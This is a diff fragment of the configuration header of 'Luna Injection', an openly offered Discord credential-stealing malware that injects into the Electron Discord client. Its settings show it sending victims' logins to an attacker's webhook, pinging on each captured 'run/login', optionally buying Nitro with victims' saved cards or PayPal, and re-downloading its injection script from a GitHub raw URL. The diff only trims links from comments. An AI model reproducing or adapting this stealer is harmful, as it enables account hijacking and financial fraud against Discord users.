@@ -6,14 +6,14 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
+  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from so your webhook can't be spammed or deleted
+  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using 
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Luna Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/928943008857088030/1055857357369917510/1670514187_youloveit_com_wednesday_addams_profile_images01.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  embed_color: 5639644, //color for the embed, needs to be hexadecimal
   injection_url: 'https://raw.githubusercontent.com/Assassinols/injection/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
